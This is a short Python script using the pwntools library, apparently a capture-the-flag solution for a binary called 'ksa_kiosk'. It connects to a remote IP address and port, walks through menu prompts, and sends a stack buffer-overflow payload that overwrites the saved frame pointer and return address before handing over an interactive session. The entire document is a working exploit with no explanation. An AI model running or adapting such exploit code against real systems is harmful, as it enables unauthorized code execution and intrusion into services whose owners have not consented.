from pwn import *

#p = process("./ksa_kiosk")
#p = gdb.debug("./ksa_kiosk","break *0x401675")
# 0X4013AC
# 0x4013fe
p = remote("66.228.49.41",5000)
context.log_level = "debug"

payload = b'A' * 0x70  +  p64(0x404500)+ p64(0x4013fe)
p.sendlineafter("> ",str(1))
p.sendlineafter("> ",str("ypp"))
p.sendafter("> ",payload)


p.interactive()